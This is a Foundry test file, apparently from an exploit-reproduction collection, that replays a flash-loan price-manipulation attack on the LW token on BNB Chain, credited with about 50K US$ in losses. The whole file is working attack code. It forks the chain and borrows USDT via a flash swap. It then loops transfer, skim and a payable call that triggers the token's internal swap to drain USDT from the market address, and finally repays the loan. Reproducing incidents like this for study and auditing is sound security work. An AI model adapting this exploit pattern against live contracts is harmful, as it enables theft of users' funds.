// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~50K US$
// Attacker : https://bscscan.com/address/0x4404de29913e0fd055190e680771a016777973e5
// Attack Contract : https://bscscan.com/address/0xa4fbc2c95ac4240277313bf3f810c54309dfcd6c
// Vulnerable Contract : https://bscscan.com/address/0x7b8c378df8650373d82ceb1085a18fe34031784f
// Attack Tx : https://bscscan.com/tx/0xb846f3aeb9b3027fe138b23bbf41901c155bd6d4b24f08d6b83bd37a975e4e4a
// Attack Tx : https://bscscan.com/tx/0x96b34dc3a98cd4055a984132d7f3f4cc5a16b2525113b8ef83c55ac0ba2b3713

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7b8c378df8650373d82ceb1085a18fe34031784f#code

// @Analysis
// Twitter Guy : https://twitter.com/PeckShieldAlert/status/1656850634312925184
// Twitter Guy : https://twitter.com/hexagate_/status/1657051084131639296

interface ILW is IERC20 {
    function getTokenPrice() external view returns (uint256);
    function thanPrice() external view returns (uint256);
}

contract ContractTest is Test {
    ILW LW = ILW(payable(0x7B8C378df8650373d82CeB1085a18FE34031784F));
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 LP = Uni_Pair_V2(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address marketAddr = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_133_285);
        cheats.label(address(USDT), "USDT");
        cheats.label(address(LW), "LW");
        cheats.label(address(LP), "LP");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(marketAddr), "marketAddr");
    }

    function testExploit() public {
        Pair.swap(1_000_000 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        USDTToLW();
        while (USDT.balanceOf(marketAddr) > 3000 * 1e18) {
            LW.thanPrice();
            uint256 transferAmount = 2510e18 * 1e18 / LW.getTokenPrice();
            LW.transfer(address(LP), transferAmount);
            LW.thanPrice();
            LP.skim(address(this));
            payable(address(LW)).call{value: 1}(""); // Trigger the swap 3000e18 USDT to LW in the receive function
        }
        LWToUSDT();
        USDT.transfer(address(Pair), 1_002_507 * 1e18);
    }

    function USDTToLW() internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(LW);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function LWToUSDT() internal {
        LW.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(LW);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            LW.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
